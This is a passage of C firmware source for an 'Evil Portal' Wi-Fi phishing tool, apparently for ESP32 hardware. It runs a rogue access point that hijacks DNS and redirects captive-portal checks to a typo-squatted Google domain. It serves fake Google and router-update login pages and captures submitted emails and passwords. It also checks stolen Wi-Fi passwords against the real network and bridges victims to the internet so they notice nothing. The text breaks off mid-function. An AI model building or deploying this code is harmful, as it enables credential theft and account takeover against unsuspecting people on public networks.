#include "wlan_hal.h"
#include "wlan_evil_portal_html.h"

#include <string.h>
#include <stdlib.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_log.h>
#include <esp_http_server.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/idf_additions.h>
#include <lwip/sockets.h>
#include <lwip/inet.h>
#include <esp_timer.h>
#include <esp_attr.h>
#include <furi.h>
#include <btshim.h>

#define TAG "EvilPortal"
#define DNS_PORT 53
#define DNS_TASK_STACK 6144

static volatile bool s_running = false;
static volatile bool s_paused = false;
static volatile bool s_dns_run = false;

// DNS forward cache. iOS bursts 30-60 queries in seconds when CNA closes;
// the serial-forward path drops most under that load (recvfrom timeouts).
// Caching cuts upstream traffic ~70% in steady state because iOS repeats
// queries (often 2-3x per domain across A/AAAA/HTTPS). Cap TTL to keep
// fresh-enough answers; size 32 entries handles a typical iOS burst.
#define DNS_CACHE_SIZE 32
#define DNS_CACHE_TTL_MS 30000
typedef struct {
    char domain[96];
    uint16_t qtype;
    uint64_t expiry_ms;
    int resp_len;
    uint8_t resp[512];
} DnsCacheEntry;
// Live in PSRAM (~20KB) so we don't eat internal-RAM heap that the DNS task,
// httpd sockets, and lwIP buffers compete for.
static EXT_RAM_BSS_ATTR DnsCacheEntry s_dns_cache[DNS_CACHE_SIZE];
static int s_dns_cache_next = 0;

static int dns_cache_lookup(const char* domain, uint16_t qtype, uint8_t* out, int out_max) {
    uint64_t now = esp_timer_get_time() / 1000;
    for(int i = 0; i < DNS_CACHE_SIZE; i++) {
        DnsCacheEntry* e = &s_dns_cache[i];
        if(e->resp_len <= 0) continue;
        if(e->expiry_ms <= now) continue;
        if(e->qtype != qtype) continue;
        if(strcmp(e->domain, domain) != 0) continue;
        int n = (e->resp_len > out_max) ? out_max : e->resp_len;
        memcpy(out, e->resp, n);
        return n;
    }
    return 0;
}

static void dns_cache_insert(const char* domain, uint16_t qtype, const uint8_t* resp, int resp_len) {
    if(resp_len < 12 || resp_len > (int)sizeof(((DnsCacheEntry*)0)->resp)) return;
    if(!domain || !domain[0]) return;
    DnsCacheEntry* e = &s_dns_cache[s_dns_cache_next];
    s_dns_cache_next = (s_dns_cache_next + 1) % DNS_CACHE_SIZE;
    strncpy(e->domain, domain, sizeof(e->domain) - 1);
    e->domain[sizeof(e->domain) - 1] = '\0';
    e->qtype = qtype;
    e->expiry_ms = (esp_timer_get_time() / 1000) + DNS_CACHE_TTL_MS;
    e->resp_len = resp_len;
    memcpy(e->resp, resp, resp_len);
}

static void dns_cache_clear(void) {
    memset(s_dns_cache, 0, sizeof(s_dns_cache));
    s_dns_cache_next = 0;
}

// When non-zero, DNS task forwards queries to this upstream DNS (network byte
// order). Set by wlan_hal_evil_portal_set_dns_upstream() from the bridge when
// bridge becomes active. Zero = hijack mode (return AP IP for everything).
static volatile uint32_t s_dns_upstream_ip_be = 0;
static volatile bool s_verify_active = false;
static volatile bool s_verify_connected = false;
static volatile bool s_verify_failed = false;
static volatile uint8_t s_verify_disconnect_reason = 0;
static bool s_bt_was_on = false;
static bool s_event_handlers_registered = false;

static void evil_ap_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    (void)arg;
    if(event_base == WIFI_EVENT) {
        if(event_id == WIFI_EVENT_AP_STACONNECTED) {
            wifi_event_ap_staconnected_t* e = event_data;
            ESP_LOGI(TAG, "AP_STACONNECTED %02x:%02x:%02x:%02x:%02x:%02x aid=%u",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        } else if(event_id == WIFI_EVENT_AP_STADISCONNECTED) {
            wifi_event_ap_stadisconnected_t* e = event_data;
            ESP_LOGI(TAG, "AP_STADISCONNECTED %02x:%02x:%02x:%02x:%02x:%02x reason=%u",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->reason);
        } else if(event_id == WIFI_EVENT_AP_START) {
            ESP_LOGI(TAG, "AP_START");
        } else if(event_id == WIFI_EVENT_AP_STOP) {
            ESP_LOGI(TAG, "AP_STOP");
        } else if(event_id == WIFI_EVENT_STA_CONNECTED) {
            if(s_verify_active) {
                ESP_LOGI(TAG, "[verify] STA_CONNECTED");
                s_verify_connected = true;
            }
        } else if(event_id == WIFI_EVENT_STA_DISCONNECTED) {
            if(s_verify_active) {
                wifi_event_sta_disconnected_t* e = event_data;
                ESP_LOGI(TAG, "[verify] STA_DISCONNECTED reason=%u", e->reason);
                s_verify_disconnect_reason = e->reason;
                s_verify_failed = true;
            }
        }
    } else if(event_base == IP_EVENT && event_id == IP_EVENT_AP_STAIPASSIGNED) {
        ip_event_ap_staipassigned_t* e = event_data;
        uint32_t ip = e->ip.addr;
        ESP_LOGI(TAG, "AP_STAIPASSIGNED %u.%u.%u.%u",
                 (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                 (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
    }
}
static TaskHandle_t s_dns_task = NULL;
static httpd_handle_t s_http = NULL;
static esp_netif_t* s_ap_netif = NULL;
static int s_dns_socket = -1;

static uint32_t s_cred_count = 0;
static uint8_t s_channel = 1;

static WlanHalEvilPortalCredCb s_cred_cb = NULL;
static void* s_cred_cb_ctx = NULL;
static WlanHalEvilPortalValidCb s_valid_cb = NULL;
static void* s_valid_cb_ctx = NULL;
static WlanHalEvilPortalBusyCb s_busy_cb = NULL;
static void* s_busy_cb_ctx = NULL;
static bool s_verify_creds_enabled = false;
// When true, POST step=2 serves the BRIDGE_REDIRECT HTML (delayed redirect to
// google.com) instead of the GOOGLE_FAILED ("Couldn't sign you in") page.
// Set from cfg->bridge_redirect by evil_portal_start_worker.
static bool s_bridge_redirect = false;
static volatile bool s_creds_already_valid = false;

static char* s_html_buf = NULL;
static size_t s_html_len = 0;

static int hex_decode_char(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void url_decode(char* s) {
    char* w = s;
    char* r = s;
    while(*r) {
        if(*r == '+') {
            *w++ = ' ';
            r++;
        } else if(*r == '%' && r[1] && r[2]) {
            int hi = hex_decode_char(r[1]);
            int lo = hex_decode_char(r[2]);
            if(hi >= 0 && lo >= 0) {
                *w++ = (char)((hi << 4) | lo);
                r += 3;
            } else {
                *w++ = *r++;
            }
        } else {
            *w++ = *r++;
        }
    }
    *w = 0;
}

static bool extract_field(const char* body, const char* key, char* out, size_t out_size) {
    size_t klen = strlen(key);
    const char* p = body;
    while((p = strstr(p, key)) != NULL) {
        if((p == body || *(p - 1) == '&') && p[klen] == '=') {
            const char* val = p + klen + 1;
            const char* end = strchr(val, '&');
            size_t vlen = end ? (size_t)(end - val) : strlen(val);
            if(vlen >= out_size) vlen = out_size - 1;
            memcpy(out, val, vlen);
            out[vlen] = 0;
            url_decode(out);
            return true;
        }
        p += klen;
    }
    return false;
}

static void log_req_headers(httpd_req_t* req, const char* tag) {
    char val[160];
    if(httpd_req_get_hdr_value_str(req, "Host", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s Host: %s", tag, val);
    }
    if(httpd_req_get_hdr_value_str(req, "User-Agent", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s UA:   %s", tag, val);
    }
    if(httpd_req_get_hdr_value_str(req, "Accept", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s Acc:  %s", tag, val);
    }
}

static void send_portal_html(httpd_req_t* req, const char* error);

static esp_err_t handler_root(httpd_req_t* req) {
    ESP_LOGI(TAG, "GET %s", req->uri);
    log_req_headers(req, "root");
    send_portal_html(req, NULL);
    return ESP_OK;
}

// Captive-portal probe URLs (Android/Windows/Firefox): 302 to a Google-like
// typo domain. The 302 itself is the SIGNAL that tells the OS captive-portal-
// detection layer (Windows NCSI, Android CaptivePortalLogin) that this is a
// captive portal and to open the popup. Returning a 200 + HTML body directly
// satisfies the probe too well and the OS thinks it has normal internet,
// skipping the popup entirely. Keep the 302 chain.
//
// The DNS hijack resolves the redirect target to the AP IP, so the follow-up
// GET hits us with Host: accounts.googl.com -- handler_root then serves the
// portal HTML. Typo (no second "e") avoids HSTS preload which would force HTTPS.
static esp_err_t handler_probe_to_google(httpd_req_t* req) {
    static const char location[] = "http://accounts.googl.com/";
    ESP_LOGI(TAG, "probe-redirect %s -> %s", req->uri, location);
    log_req_headers(req, "probe");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", location);
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t handler_hotspot_apple(httpd_req_t* req) {
    // Once the bridge is active (s_dns_upstream_ip_be != 0 means forward mode
    // is on, set by the bridge when napt_enable succeeded), serve iOS's
    // exact expected "Success" body. iOS CNA detects this and closes itself,
    // marks the network as having real internet, and the victim can browse
    // normally in Safari without iOS disassociating.
    if(s_dns_upstream_ip_be != 0) {
        ESP_LOGI(TAG, "probe-apple %s -> Success (bridge active)", req->uri);
        static const char success[] =
            "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_send(req, success, sizeof(success) - 1);
        return ESP_OK;
    }

    if(s_bridge_redirect && s_cred_count > 0) {
        ESP_LOGI(TAG, "probe-apple %s -> spinner (waiting on bridge)", req->uri);
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_send(req, EVIL_PORTAL_HTML_BRIDGE_REDIRECT,
                        EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN);
        return ESP_OK;
    }

    ESP_LOGI(TAG, "probe-apple %s -> meta-refresh (no bridge yet)", req->uri);
    static const char body[] =
        "<HTML><HEAD>"
        "<META http-equiv=\"refresh\" content=\"0;url=http://172.0.0.1/\">"
        "</HEAD><BODY>Captive</BODY></HTML>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, body, sizeof(body) - 1);
    return ESP_OK;
}

static void send_step2_with_email(httpd_req_t* req, const char* email) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");

    static const char marker[] = "%EMAIL%";
    const size_t marker_len = sizeof(marker) - 1;
    const size_t email_len = strlen(email);
    const char* p = EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL;

    while(*p) {
        const char* hit = strstr(p, marker);
        if(!hit) {
            httpd_resp_send_chunk(req, p, strlen(p));
            break;
        }
        if(hit > p) {
            httpd_resp_send_chunk(req, p, hit - p);
        }
        if(email_len > 0) {
            httpd_resp_send_chunk(req, email, email_len);
        }
        p = hit + marker_len;
    }
    httpd_resp_send_chunk(req, NULL, 0);
}

// Holds substitutions for placeholders in router/portal HTML.
// Each pair is (marker, replacement). NULL marker terminates the array.
typedef struct {
    const char* marker;
    const char* replacement;
} HtmlSubst;

static char* s_router_ssid_options = NULL; // <option> list, set before start

static void send_html_with_substs(httpd_req_t* req, const char* html, const HtmlSubst* substs) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");

    const char* p = html;
    while(*p) {
        const char* earliest = NULL;
        const HtmlSubst* hit_subst = NULL;
        for(const HtmlSubst* s = substs; s->marker; s++) {
            const char* found = strstr(p, s->marker);
            if(found && (!earliest || found < earliest)) {
                earliest = found;
                hit_subst = s;
            }
        }
        if(!earliest) {
            httpd_resp_send_chunk(req, p, strlen(p));
            break;
        }
        if(earliest > p) httpd_resp_send_chunk(req, p, earliest - p);
        if(hit_subst->replacement && hit_subst->replacement[0]) {
            httpd_resp_send_chunk(req, hit_subst->replacement, strlen(hit_subst->replacement));
        }
        p = earliest + strlen(hit_subst->marker);
    }
    httpd_resp_send_chunk(req, NULL, 0);
}

// Send the currently active portal HTML (s_html_buf -- can be Google, Router,
// or a custom SD template) with the standard placeholder substitutions.
static void send_portal_html(httpd_req_t* req, const char* error) {
    const char* html = s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE;
    HtmlSubst substs[] = {
        {"%ERROR%", error},
        {"%SSID_OPTIONS%", s_router_ssid_options},
        {NULL, NULL},
    };
    send_html_with_substs(req, html, substs);
}

static const char EVIL_PORTAL_HTML_ROUTER_SUCCESS[] =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Update Complete</title>"
    "<style>"
    "body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f4;margin:0;padding:20px;color:#333}"
    ".card{max-width:420px;margin:40px auto;background:#fff;border:1px solid #ddd;border-radius:6px;padding:24px;box-shadow:0 2px 4px rgba(0,0,0,.05);text-align:center}"
    "h1{font-size:18px;margin:0 0 12px;color:#27ae60}"
    "p{font-size:14px;line-height:1.5;margin:0 0 16px}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<h1>&#10004; Update Complete</h1>"
    "<p>Your router will reconnect to the network shortly. You can close this page.</p>"
    "</div></body></html>";

static esp_err_t handler_post(httpd_req_t* req) {
    ESP_LOGI(TAG, "POST %s content_len=%u", req->uri, (unsigned)req->content_len);
    char body[512];
    int total = 0;
    int remaining = req->content_len;
    if(remaining > (int)sizeof(body) - 1) remaining = sizeof(body) - 1;
    while(remaining > 0) {
        int r = httpd_req_recv(req, body + total, remaining);
        if(r <= 0) {
            if(r == HTTPD_SOCK_ERR_TIMEOUT) continue;
            return ESP_FAIL;
        }
        total += r;
        remaining -= r;
    }
    body[total] = 0;

    char step[4] = {0};
    extract_field(body, "step", step, sizeof(step));

    char user[64] = {0};
    char pwd[64] = {0};

    if(!extract_field(body, "email", user, sizeof(user))) {
        if(!extract_field(body, "username", user, sizeof(user))) {
            extract_field(body, "user", user, sizeof(user));
        }
    }
    if(!extract_field(body, "password", pwd, sizeof(pwd))) {
        extract_field(body, "pass", pwd, sizeof(pwd));
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");

    // Google 3-step flow: step=1 carries only email -> render step 2 with the
    // entered email substituted in, no credentials captured yet.
    if(strcmp(step, "1") == 0 && user[0] && !pwd[0]) {
        ESP_LOGI(TAG, "google step1: email=%s -> rendering step2", user);
        send_step2_with_email(req, user);
        return ESP_OK;
    }

    // step=1 without an email (e.g. browser without `required` support):
    // re-serve step 1 instead of falling through to the generic LOADING page.
    if(strcmp(step, "1") == 0 && !user[0]) {
        ESP_LOGI(TAG, "google step1: empty email -> re-rendering step1");
        httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_STEP1, EVIL_PORTAL_HTML_GOOGLE_STEP1_LEN);
        return ESP_OK;
    }

    // step=2 (or any single-step template like Router) -> capture credentials.
    if(user[0] || pwd[0]) {
        s_cred_count++;
        ESP_LOGI(TAG, "Captured: %s / %s", user, pwd[0] ? "***" : "(empty)");
        if(s_cred_cb) s_cred_cb(user, pwd, s_cred_cb_ctx);
    }

    // Router-template with verify enabled: try to associate with the entered
    // creds against the real WLAN. Success -> notify UI + serve success page.
    // Failure -> serve router HTML with an error banner so the victim retries.
    if(s_verify_creds_enabled && step[0] == 0 && user[0] && pwd[0]) {
        if(s_creds_already_valid) {
            // Already captured a valid pair earlier; just acknowledge.
            httpd_resp_send(
                req, EVIL_PORTAL_HTML_ROUTER_SUCCESS, sizeof(EVIL_PORTAL_HTML_ROUTER_SUCCESS) - 1);
            return ESP_OK;
        }

        if(s_busy_cb) s_busy_cb(true, "Verifying creds...", s_busy_cb_ctx);
        bool ok = wlan_hal_evil_portal_verify_creds(user, pwd);
        if(s_busy_cb) s_busy_cb(false, NULL, s_busy_cb_ctx);
        ESP_LOGI(TAG, "verify '%s' -> %s", user, ok ? "VALID" : "INVALID");

        if(ok) {
            s_creds_already_valid = true;
            if(s_valid_cb) s_valid_cb(user, pwd, s_valid_cb_ctx);
            httpd_resp_send(
                req, EVIL_PORTAL_HTML_ROUTER_SUCCESS, sizeof(EVIL_PORTAL_HTML_ROUTER_SUCCESS) - 1);
        } else {
            send_portal_html(req, "Wrong password &mdash; please try again.");
        }
        return ESP_OK;
    }

    if(strcmp(step, "2") == 0) {
        if(s_bridge_redirect) {
            // Bridge mode: show "Signing in..." with delayed redirect to google.com.
            // The bridge starts asynchronously when cred_cb returns; 7s gives it
            // time to come up (APSTA + auth + DHCP + DHCPS dance + napt_enable
            // takes ~3-5s) before the browser follows the redirect.
            httpd_resp_send(req, EVIL_PORTAL_HTML_BRIDGE_REDIRECT,
                            EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN);
        } else {
            httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED,
                            EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
        }
    } else {
        httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
                        s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
    }
    return ESP_OK;
}

static esp_err_t handler_catch_all(httpd_req_t* req, httpd_err_code_t err) {
    (void)err;
    ESP_LOGI(TAG, "catch-all %s -> serve portal", req->uri);
    log_req_headers(req, "catch");
    send_portal_html(req, NULL);
    return ESP_OK;
}

static const httpd_uri_t uri_root_get = {
    .uri = "/", .method = HTTP_GET, .handler = handler_root, .user_ctx = NULL};
static const httpd_uri_t uri_post_post = {
    .uri = "/post", .method = HTTP_POST, .handler = handler_post, .user_ctx = NULL};
static const httpd_uri_t uri_post_get = {
    .uri = "/post", .method = HTTP_GET, .handler = handler_post, .user_ctx = NULL};

static const char* probe_uris[] = {
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/success.txt",
    "/canonical.html",
    "/fwlink",
    "/redirect",
};

// Phone-home URLs that are NOT captive-portal probes but Windows clients hammer
// them on join (Chrome/Edge WPAD auto-discovery, browser favicon, PAC lookups).
// Without explicit handlers these fall through to the catch-all which serves
// the full ~3.7KB portal HTML, eating sockets and time. Fast-reject with a
// minimal 404 + Connection: close keeps the socket pool free for the actual
// captive-portal GET that the browser CNA tab is racing to make.
static const char* fast_reject_uris[] = {
    "/wpad.dat",
    "/wpad.da",
    "/proxy.pac",
    "/favicon.ico",
};

static esp_err_t handler_fast_reject(httpd_req_t* req) {
    ESP_LOGI(TAG, "fast-reject %s", req->uri);
    httpd_resp_set_status(req, "404 Not Found");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t http_open_cb(httpd_handle_t hd, int sockfd) {
    (void)hd;
    struct sockaddr_in6 addr;
    socklen_t addr_len = sizeof(addr);
    char ip_str[40] = "?";
    uint16_t port = 0;
    if(getpeername(sockfd, (struct sockaddr*)&addr, &addr_len) == 0) {
        if(addr.sin6_family == AF_INET6) {
            struct sockaddr_in* a4 = (struct sockaddr_in*)&addr;
            uint32_t ip = a4->sin_addr.s_addr;
            snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
                     (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                     (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
            port = ntohs(a4->sin_port);
        }
    }
    ESP_LOGI(TAG, "TCP open  fd=%d from %s:%u", sockfd, ip_str, port);
    return ESP_OK;
}

static void http_close_cb(httpd_handle_t hd, int sockfd) {
    (void)hd;
    ESP_LOGI(TAG, "TCP close fd=%d", sockfd);
    close(sockfd);
}

static bool start_http(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 24;
    // Bumped from 7 → 13: Windows clients open many parallel connections (Steam,
    // Discord, Chrome, WPAD, NCSI, etc) the moment they detect a new network,
    // and 7 sockets exhausts within milliseconds, dropping browser captive-portal
    // probes with ERR_CONNECTION_RESET. 13 is the practical max per ESP-IDF.
    config.max_open_sockets = 13;
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.lru_purge_enable = true;
    // Aggressive recv timeout so a stuck client doesn't squat a socket forever.
    config.recv_wait_timeout = 5;
    config.send_wait_timeout = 5;
    config.open_fn = http_open_cb;
    config.close_fn = http_close_cb;

    ESP_LOGI(TAG, "httpd_start: port=%u max_uri=%u max_sockets=%u",
             config.server_port, config.max_uri_handlers, config.max_open_sockets);
    if(httpd_start(&s_http, &config) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        return false;
    }
    ESP_LOGI(TAG, "httpd_start OK, handle=%p", s_http);
    httpd_register_uri_handler(s_http, &uri_root_get);
    httpd_register_uri_handler(s_http, &uri_post_post);
    httpd_register_uri_handler(s_http, &uri_post_get);

    // Probe URLs (Android, Windows, Firefox) -> 302 redirect so the address
    // bar shows accounts.googl.com instead of the probe host (e.g.
    // connectivitycheck.gstatic.com). DNS hijack resolves the typo domain to
    // our AP IP, then handler_root serves the portal on the follow-up GET.
    for(size_t i = 0; i < sizeof(probe_uris) / sizeof(probe_uris[0]); i++) {
        httpd_uri_t u = {
            .uri = probe_uris[i], .method = HTTP_GET, .handler = handler_probe_to_google, .user_ctx = NULL};
        httpd_register_uri_handler(s_http, &u);
    }

    static const httpd_uri_t uri_apple = {
        .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = handler_hotspot_apple, .user_ctx = NULL};
    static const httpd_uri_t uri_apple_lib = {
        .uri = "/library/test/success.html", .method = HTTP_GET, .handler = handler_hotspot_apple, .user_ctx = NULL};
    httpd_register_uri_handler(s_http, &uri_apple);
    httpd_register_uri_handler(s_http, &uri_apple_lib);

    // Fast-reject phone-home URLs BEFORE the catch-all 404 fallback so they
    // close the socket in <1ms instead of serving the full portal HTML.
    for(size_t i = 0; i < sizeof(fast_reject_uris) / sizeof(fast_reject_uris[0]); i++) {
        httpd_uri_t u = {
            .uri = fast_reject_uris[i], .method = HTTP_GET, .handler = handler_fast_reject, .user_ctx = NULL};
        httpd_register_uri_handler(s_http, &u);
    }

    httpd_register_err_handler(s_http, HTTPD_404_NOT_FOUND, handler_catch_all);
    // Also serve the portal on header-too-long / URL-too-long errors instead
    // of returning 431/414 (smartphones send big cookie blobs to captive APs).
    httpd_register_err_handler(s_http, HTTPD_400_BAD_REQUEST, handler_catch_all);
    httpd_register_err_handler(s_http, HTTPD_414_URI_TOO_LONG, handler_catch_all);
    httpd_register_err_handler(s_http, HTTPD_431_REQ_HDR_FIELDS_TOO_LARGE, handler_catch_all);
    return true;
}

static void stop_http(void) {
    if(s_http) {
        httpd_stop(s_http);
        s_http = NULL;
    }
}

static void dns_task(void* arg) {
    (void)arg;

    ESP_LOGI(TAG, "DNS task entry");
    s_dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s_dns_socket < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        s_dns_task = NULL;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if(bind(s_dns_socket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed");
        close(s_dns_socket);
        s_dns_socket = -1;
        s_dns_task = NULL;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
    setsockopt(s_dns_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint32_t ap_ip = 0;
    {
        esp_netif_ip_info_t info;
        if(s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &info) == ESP_OK) {
            ap_ip = info.ip.addr;
        } else {
            ap_ip = htonl(0xAC000001); // 172.0.0.1
        }
        ESP_LOGI(TAG, "DNS bound, redirecting to %u.%u.%u.%u",
                 (unsigned)(ap_ip & 0xff), (unsigned)((ap_ip >> 8) & 0xff),
                 (unsigned)((ap_ip >> 16) & 0xff), (unsigned)((ap_ip >> 24) & 0xff));
    }

    uint8_t buf[512];
    char domain[128];
    while(s_dns_run) {
        struct sockaddr_in src;
        socklen_t slen = sizeof(src);
        int n = recvfrom(s_dns_socket, buf, sizeof(buf), 0, (struct sockaddr*)&src, &slen);
        if(n < 12) continue;

        // Only handle standard queries (OPCODE=0, QR=0)
        if((buf[2] & 0xF8) != 0x00) continue;

        // Find end of QName
        int p = 12;
        size_t dlen = 0;
        while(p < n && buf[p] != 0) {
            uint8_t lbl = buf[p];
            if(lbl >= 0xC0) break; // compressed name not expected in question
            if(p + 1 + lbl > n) { p = n; break; }
            if(dlen) { if(dlen < sizeof(domain) - 1) domain[dlen++] = '.'; }
            for(int i = 0; i < lbl && dlen < sizeof(domain) - 1; i++) {
                domain[dlen++] = buf[p + 1 + i];
            }
            p += lbl + 1;
        }
        domain[dlen] = 0;
        if(p >= n || buf[p] != 0) continue;
        if(p + 5 > n) continue; // need null + QType + QClass

        uint16_t qtype = (buf[p + 1] << 8) | buf[p + 2];
        int qend = p + 1 + 4;

        bool is_a = (qtype == 1 || qtype == 255);

        // FORWARD MODE: if bridge is active and an upstream DNS was provided,
        // proxy the raw query upstream and return the upstream's full answer.
        // Reuses buf for the upstream response (we've already used the query
        // bytes by the time we're recv'ing the response, so clobbering is safe).
        //
        // CRITICAL: must connect() the UDP socket BEFORE send() so lwIP picks
        // the source IP from the STA interface's route to upstream, not from
        // the AP interface (172.0.0.1). The upstream router will drop queries
        // sourced from a non-LAN IP, causing recvfrom to timeout silently.
        // Falls back to 1.1.1.1 (Cloudflare) if upstream DNS doesn't respond
        // -- some routers block direct DNS queries from non-LAN sources or
        // delegate DNS upstream rather than serving it themselves.
        uint32_t upstream = s_dns_upstream_ip_be;
        if(upstream != 0) {
            // Cache check first — iOS repeats the same query 2-3x in seconds.
            // Splice the requesting client's query ID (buf[0..1]) into the
            // cached response so the client recognizes it as their answer.
            uint8_t cached[512];
            int clen = dns_cache_lookup(domain, qtype, cached, sizeof(cached));
            if(clen > 0) {
                cached[0] = buf[0];
                cached[1] = buf[1];
                sendto(s_dns_socket, cached, clen, 0, (struct sockaddr*)&src, slen);
                ESP_LOGI(TAG, "DNS-cache q='%s' type=%u -> %d bytes (hit)", domain, qtype, clen);
                continue;
            }

            // Try Cloudflare (1.1.1.1) FIRST: it has predictably-fast response
            // times. Some consumer routers act as DNS proxies and take 5-15s
            // on cold-cache recursive lookups, which exceeds our per-target
            // timeout. Falling back to upstream second handles the case where
            // 1.1.1.1 is
            // blocked.
            uint32_t targets[2] = { htonl(0x01010101) /* 1.1.1.1 */, upstream };
            int got = 0;
            int got_len = 0;
            // Bind forward socket to STA interface IP so lwIP picks the right
            // source. Without this, in APSTA mode lwIP defaults to the AP-side
            // IP (172.0.0.1) as source, the upstream router sees a packet from
            // outside its subnet and drops it -> recvfrom timeouts.
            uint32_t sta_ip_be = 0;
            esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
            if(sta_netif) {
                esp_netif_ip_info_t info = {0};
                if(esp_netif_get_ip_info(sta_netif, &info) == ESP_OK) {
                    sta_ip_be = info.ip.addr;
                }
            }
            for(int ti = 0; ti < 2 && !got; ti++) {
                int fwd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(fwd < 0) break;
                struct timeval tv2 = {.tv_sec = 3, .tv_usec = 0};
                setsockopt(fwd, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
                setsockopt(fwd, SOL_SOCKET, SO_SNDTIMEO, &tv2, sizeof(tv2));
                int bind_rc = -1;
                if(sta_ip_be != 0) {
                    struct sockaddr_in bind_addr = {0};
                    bind_addr.sin_family = AF_INET;
                    bind_addr.sin_addr.s_addr = sta_ip_be;
                    bind_addr.sin_port = 0;
                    bind_rc = bind(fwd, (struct sockaddr*)&bind_addr, sizeof(bind_addr));
                }
                struct sockaddr_in dns_dst = {0};
                dns_dst.sin_family = AF_INET;
                dns_dst.sin_port = htons(53);
                dns_dst.sin_addr.s_addr = targets[ti];
                if(connect(fwd, (struct sockaddr*)&dns_dst, sizeof(dns_dst)) == 0) {
                    int sent = send(fwd, buf, n, 0);
                    if(sent == n) {
                        int rn = recv(fwd, buf, sizeof(buf), 0);
                        if(rn > 12) {
                            sendto(s_dns_socket, buf, rn, 0, (struct sockaddr*)&src, slen);
                            ESP_LOGI(TAG, "DNS-fwd q='%s' type=%u -> %d bytes from %u.%u.%u.%u",
                                     domain, qtype, rn,
                                     (unsigned)(targets[ti] & 0xff),
                                     (unsigned)((targets[ti] >> 8) & 0xff),
                                     (unsigned)((targets[ti] >> 16) & 0xff),
                                     (unsigned)((targets[ti] >> 24) & 0xff));
                            got = 1;
                            got_len = rn;
                        }
                    }
                }
                close(fwd);
            }
            if(got) {
                dns_cache_insert(domain, qtype, buf, got_len);
                continue;
            }
            ESP_LOGW(TAG, "DNS-fwd q='%s' FAILED (tried upstream %u.%u.%u.%u + 1.1.1.1, sta_ip=%u.%u.%u.%u), falling back to hijack",
                     domain,
                     (unsigned)(upstream & 0xff),
                     (unsigned)((upstream >> 8) & 0xff),
                     (unsigned)((upstream >> 16) & 0xff),
                     (unsigned)((upstream >> 24) & 0xff),
                     (unsigned)(sta_ip_be & 0xff),
                     (unsigned)((sta_ip_be >> 8) & 0xff),
